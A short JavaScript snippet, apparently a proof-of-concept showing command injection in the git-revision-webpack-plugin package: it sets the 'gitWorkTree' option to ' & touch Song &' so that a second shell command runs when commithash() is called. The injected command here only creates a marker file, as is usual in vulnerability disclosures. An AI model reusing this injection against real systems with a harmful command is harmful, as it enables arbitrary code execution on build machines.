var Root = require("git-revision-webpack-plugin");
var run_code = " & touch Song &";
var opt = {
  "gitWorkTree": run_code
}
var root = new Root(opt);
root.commithash();
